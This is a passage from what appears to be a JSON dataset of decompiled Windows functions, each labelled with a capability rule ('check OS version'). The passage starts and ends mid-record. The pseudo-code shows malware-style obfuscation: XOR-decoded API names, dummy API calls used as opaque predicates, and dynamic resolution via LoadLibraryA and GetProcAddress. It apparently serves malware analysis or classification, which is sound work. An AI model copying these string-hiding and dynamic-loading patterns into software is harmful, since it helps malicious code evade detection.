(*0x41dd30 == 0) {\n            uVar1 = (*pcVar5)(0, var_4h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0x33202162;\n            var_44h = 0x83f6e1f;\n            var_40h = 0x55e2025;\n            var_3ch = 0x511b3108;\n            var_38h = var_38h & 0xff000000 | 0x520339;\n            var_2ch = 0x526d5638;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x6f);\n            uVar1 = (*pcVar5)(8, 0x14);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_24h = &var_48h - iVar2;\n            var_10h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar3 = var_8h;\n                if (iVar4 != 0xdf8175) {\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_24h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x13);\n            *0x41dd38 = fcn.00409867(iVar2);\n            iVar2 = var_14h;\n            if (*0x41dd38 != 0) {\n                var_48h = 0xf164410;\n                var_44h = 0x653a310f;\n                var_40h = 0x1f15042a;\n                var_3ch = 0x226602c;\n                var_38h = 0x5d253916;\n                var_34h = 0x43;\n                var_2ch = 0x6143334a;\n                var_28h._0_2_ = 0x5062;\n                uVar1 = (*pcVar5)(8, 0x16);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_24h = &var_48h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                    iVar3 = var_8h;\n                    if (iVar4 != 0xbda551) {\n                        *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_24h];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x15);\n                *0x41dd40 = fcn.00409867(iVar2);\n                if (*0x41dd40 != 0) {\n                    uVar1 = (*pcVar5)(0, iVar2);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_10h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_4h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_14h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar3);\n                    (*pcVar7)(uVar1);\n                    goto code_r0x00409718;\n                }\n                uVar1 = (*pcVar5)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_10h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_4h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                goto code_r0x00409493;\n            }\n            uVar1 = (*pcVar5)(0, var_10h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar7)(0, iVar3);\n        (*pcVar5)(uVar1);\n    }\ncode_r0x0040971d:\n    *0x41dd3c = *0x41dd38 >> 0x20;\n    *0x41dd44 = *0x41dd40 >> 0x20;\n    *0x41dd34 = *0x41dd30 >> 0x20;\n    *0x41dd2c = *0x41dd28 >> 0x20;\n    return var_ch;\n}\n",
        "token_count": 2481
    },
    "004099e8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004099e8(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_2ch = 0x6828415c;\n    var_28h = 0x415d3213;\n    var_24h._0_2_ = 0x6858;\n    var_20h = 0x68584133;\n    var_1ch._0_2_ = 0x3276;\n    var_14h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 6;\n    iVar8 = 0;\n    var_8h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar4 != 0x25e3cc) {\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_2ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_30h = 0x1611093e;\n    var_2ch = 0x7a735e38;\n    var_28h = 0x4101183e;\n    var_20h = 0x5a54416d;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x74);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar4 != 0x707487) {\n            var_ch = 5;\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_30h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_30h = 0x39141d19;\n    var_2ch = 0x10322925;\n    var_28h = 0x93d2012;\n    var_24h._0_2_ = 0x751d;\n    var_20h = 0x5571754a;\n    var_1ch._0_2_ = 0x6c49;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_30h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0x2efb7f) {\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_30h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar7 = (*pcVar6)(0, var_8h, var_18h, var_14h, 0, 0);\n    if (0x20 < uVar7) {\n        uVar7 = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar2);\n    return uVar7;\n}\n",
        "token_count": 1170
    },
    "00409e40": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00409e40(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uchar *var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint hObject;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar9 = &var_84h;\n    var_64h = param_2;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_6ch = *0x41daa0;\n    var_68h = 0;\n    dwBytes = 0;\n    var_60h = 0;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x23;\n    var_ch._2_1_ = 0xc;\n    var_ch._3_1_ = 0xf;\n    var_8h._0_2_ = 0x661e;\n    var_8h._2_1_ = 0x33;\n    var_8h._3_1_ = 4;\n    var_4h._0_2_ = 0x720f;\n    var_24h = 0x63685748;\n    var_20h._0_1_ = 0x72;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xc1c0d5) {\n            var_18h = 0x5;\n            *(iVar7 + iVar6) = *(&var_24h + iVar7 % 5) ^ (iVar7 + iVar6)[&var_ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_10h._0_2_ = 0x1f2a;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x2b;\n    var_18h = 0x6;\n    var_ch._1_1_ = 6;\n    var_ch._2_1_ = 0x20;\n    var_ch._3_1_ = 0x1a;\n    var_8h._0_2_ = 0x2a27;\n    var_8h._2_1_ = 0x2b;\n    var_8h._3_1_ = 0x1b;\n    var_4h._0_2_ = 0x6803;\n    var_34h = 0x49486870;\n    var_30h._0_2_ = 0x684e;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_24h = iVar6;\n    var_1ch = &var_10h - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x50bb7b) {\n            *(iVar7 + iVar6) = *(&var_34h + iVar7 % var_18h) ^ (&var_10h - iVar6)[iVar7 + iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_84h = 0x18;\n    var_80h = 0;\n    var_78h = 0;\n    var_7ch = 0;\n    var_74h = 0;\n    var_70h = 0;\n    iVar7 = (*pcVar5)(&var_5ch, 0x400, &var_84h, &var_6ch);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_14h = 0x3336020c;\n        var_10h._0_2_ = 0x565d;\n        var_10h._2_1_ = 6;\n        var_10h._3_1_ = 7;\n        var_ch._0_1_ = 0x16;\n        var_ch._1_1_ = 0x20;\n        var_ch._2_1_ = 0x5d;\n        var_ch._3_1_ = 0x4b;\n        var_8h._0_2_ = 0x2125;\n        var_8h._2_1_ = 0x16;\n        var_8h._3_1_ = 0x28;\n        var_4h._0_2_ = 0x565d;\n        var_4h._2_1_ = 0x56;\n        var_2ch = 0x43797556;\n        var_28h._0_2_ = 0x3838;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_34h = iVar6;\n        var_1ch = &var_14h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n            iVar3 = lpLibFileName;\n            if (iVar4 != 0xf40466) {\n                *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_18h) ^ (&var_14h - iVar6)[iVar7 + iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x13);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        iVar7 = (*pcVar5)(var_5ch, 8, &hObject);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar7) {\n            var_54h = 0x370703;\n            var_50h = 0x39203c04;\n            var_4ch = 0x3c0e1308;\n            var_48h = 0x1c121134;\n            var_44h = 0x1f0d200e;\n            var_40h = 0x4e0f100d;\n            var_8h._0_2_ = 0x7059;\n            var_8h._2_1_ = 0x66;\n            var_8h._3_1_ = 0x75;\n            var_4h._0_2_ = 0x4e61;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_2ch = iVar6;\n            var_1ch = &var_54h - iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                iVar3 = lpLibFileName;\n                if (iVar4 != 0x22b540) {\n                    *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_18h) ^ (iVar7 + iVar6)[&var_54h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x18);\n            uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n            var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*var_1ch)(hObject, 1, 0, 0, &dwBytes);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_18h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_18h != NULL) {\n                iVar7 = (*var_1ch)(hObject, 1, var_18h, dwBytes, &dwBytes);\n                if (-1 < iVar7) {\n                    puVar8 = *var_18h;\n                    puVar10 = var_64h;\n                    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_60h = 1;\n                    iVar6 = var_2ch;\n                    iVar3 = lpLibFileName;\n                }\n                uVar2 = (*pcVar5)(0, var_18h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar2 = (*pcVar5)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar6 = var_34h;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_5ch);\n        uVar2 = (*pcVar5)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        iVar6 = var_24h;\n    }\n    uVar2 = (*pcVar5)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    return var_60h;\n}\n",
        "token_count": 2664
    },
    "0040b198": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b198(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_27h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf0c2326;\n    var_20h = 0x433661e;\n    var_1ch._0_2_ = 0x720f;\n    var_18h = 0x63685748;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x72);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xc1c0d5) {\n            var_4h = 5;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0x235b3c10;\n    var_38h = 0x29360437;\n    var_34h = 0x3301843;\n    var_30h = 0x1e580c2d;\n    var_4h = 6;\n    var_2ch._0_1_ = 6;\n    stack0xffffffd1 = 0x45273025;\n    var_27h = 0x6d;\n    var_18h = 0x6d374842;\n    var_14h._0_2_ = 0x5743;\n    uVar1 = (*pcVar5)(8, 0x17);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x4dc380) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 905
    },
    "0040b2d1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b2d1(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf0c2326;\n    var_20h = 0x433661e;\n    var_1ch._0_2_ = 0x720f;\n    var_18h = 0x63685748;\n    var_14h._0_1_ = 0x72;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xc1c0d5) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_24h = 0x372b1801;\n    var_20h = 0x28083d1b;\n    var_1ch._0_2_ = 0x7a08;\n    var_18h = 0x65476c53;\n    var_14h._0_1_ = 0x7a;\n    uVar1 = (*pcVar5)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x7709a7) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_24h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 795
    },
    "0040b3ec": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040b3ec(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    puVar8 = &var_28h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x37190b;\n    var_38h = 0x1f04133c;\n    var_34h = 0x3e230316;\n    var_30h = 0x2c38021f;\n    var_2ch._0_2_ = 0x1402;\n    var_2ch._2_1_ = 0x61;\n    var_20h = 0x617a6d45;\n    var_1ch._0_1_ = 0x4c;\n    var_14h = in_EDX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar6;\n    var_ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar2 != 0x6a370a) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x13);\n    var_34h = 0xf0c2326;\n    var_30h = 0x433661e;\n    var_2ch._0_2_ = 0x720f;\n    var_20h = 0x63685748;\n    var_1ch._0_1_ = 0x72;\n    uVar1 = (*pcVar4)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_34h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        iVar2 = var_ch;\n        if (iVar3 != 0xc1c0d5) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_34h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_ch);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar4)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar1 = fcn.0040b198();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar4)(uVar5);\n    return uVar1;\n}\n",
        "token_count": 1020
    },
    "0040b548": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b548(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    ushort var_38h;\n    uint var_36h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf0c2326;\n    var_20h = 0x433661e;\n    var_1ch._0_2_ = 0x720f;\n    var_18h = 0x63685748;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x72);\n    var_10h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xc1c0d5) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_36h._0_1_ = 5;\n    var_3ch = 0x20341c3b;\n    var_38h = 0x231e;\n    stack0xffffffc7 = 0x42b083e;\n    var_31h = 0x43b130d;\n    var_2dh = 0x1a2b072d;\n    var_4h = 6;\n    var_29h._0_1_ = 6;\n    var_29h._1_1_ = 0x61;\n    var_18h = 0x4e616875;\n    var_14h._0_2_ = 0x4273;\n    uVar1 = (*pcVar5)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x282ce8) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x15);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar5)(0xffffffff, var_10h);\n    uVar1 = fcn.0040b198();\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 959
    },
    "0040b68f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
